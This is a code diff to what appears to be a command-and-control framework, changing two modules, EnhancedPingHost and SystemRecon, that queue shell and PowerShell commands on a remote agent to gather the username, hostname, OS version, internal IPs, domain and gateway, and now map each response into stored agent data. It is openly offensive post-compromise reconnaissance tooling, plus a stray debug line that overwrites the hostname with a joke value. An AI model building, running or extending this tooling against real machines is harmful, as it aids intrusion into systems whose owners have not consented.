@@ -28,6 +28,11 @@ class EnhancedPingHost(BaseCommand):
         ping_response = self.agent_class.get_one_command_and_response(ping_id).get(
             "response", ""
         )
+
+        # set output to data
+        self.agent_class.data.system.hostname = "URMOM"
+        self.agent_class.unload_data()
+
         if "Reply from" in ping_response:
             print("Ping successful. Proceeding with additional recon.")
             for cmd in ["shell whoami", "shell hostname"]:
@@ -53,18 +58,20 @@ class SystemRecon(BaseCommand):
         super().__init__(command, args_list, agent_id)
         self.agent_class = BaseAgent(agent_id)
 
+    # this is how we are gonna do it
     def run(self):
         # list of commands to run
-        cmds = [
-            "shell ver",
-            "shell whoami",
-            "shell hostname",
-            # get all local IP's
-            "shell powershell -c \"(Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress) -join ', '\" ",
-            'shell powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"',
-            'shell powershell -c "(Get-NetIPConfiguration | Where-Object IPv4DefaultGateway).IPv4DefaultGateway.NextHop"',
-        ]
-        for cmd in cmds:
+        cmds = {
+            "shell ver": "system.os",
+            "shell whoami": "system.username",
+            "shell hostname": "system.hostname",
+            "shell powershell -c \"(Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress) -join ', '\"": "network.internal_ip",
+            'shell powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"': "network.domain",
+            'shell powershell -c "(Get-NetIPConfiguration | Where-Object IPv4DefaultGateway).IPv4DefaultGateway.NextHop"': "network.external_ip",
+        }
+
+        for cmd, location in cmds.items():
+            self.agent_class.store_command_response_on_callback(cmd, location)
             self.agent_class.enqueue_command(cmd)
 
 
